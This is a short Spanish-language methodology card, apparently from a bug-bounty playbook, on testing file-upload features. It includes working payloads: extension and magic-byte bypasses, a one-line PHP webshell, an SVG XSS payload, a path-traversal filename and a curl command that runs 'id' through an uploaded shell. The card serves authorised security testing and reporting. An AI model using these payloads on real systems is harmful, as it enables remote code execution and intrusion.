# File Upload

## Señales de entrada
- Formularios de subida de archivos (imagen, documento, CSV, avatar).
- Endpoints de import (Excel, JSON, XML).
- Funciones de upload por URL.
- APIs con `multipart/form-data`.

## Metodología

### Paso 1: identificar qué se valida
- ¿Validación por extensión? ¿Content-Type? ¿Magic bytes? ¿Ninguna?
- ¿Dónde se guarda el archivo? ¿En un path accesible?
- ¿Se renombra el archivo? ¿Conserva la extensión?

### Paso 2: bypass de validación
```
# Extensión doble
shell.php.jpg
shell.php%00.jpg
shell.php5
shell.phtml
shell.shtml

# Content-Type bypass
# Cambiar en Burp: Content-Type: image/jpeg pero cuerpo es PHP

# Magic bytes
# Añadir GIF89a al inicio del webshell
GIF89a <?php system($_GET['cmd']); ?>

# SVG con XSS
<svg><script>alert(document.domain)</script></svg>
```

### Paso 3: acceder al archivo subido
```
# Path traversal en nombre de archivo
../../../var/www/html/shell.php

# Buscar la URL de acceso en la respuesta
{"file_url": "https://cdn.example.com/uploads/abc123/shell.php"}

# Ejecutar
curl https://example.com/uploads/shell.php?cmd=id
```

### Casos de impacto sin RCE
- Subir SVG con XSS → stored XSS.
- Subir HTML → phishing desde dominio legítimo.
- Subir CSV malicioso → formula injection en Excel.
- Subir XML con XXE payload.
- Subir archivo enorme → DoS (si el programa lo acepta como vuln).

## Impacto alto
- RCE via webshell ejecutable en servidor.
- Stored XSS via SVG/HTML subido.
- XXE via XML/SVG upload.

## Evidencia mínima
- Para RCE: output de `id` o `whoami` en respuesta.
- Para XSS: `alert(document.domain)` ejecutado desde el archivo subido.
- Request completo de upload + URL de acceso + request de ejecución.
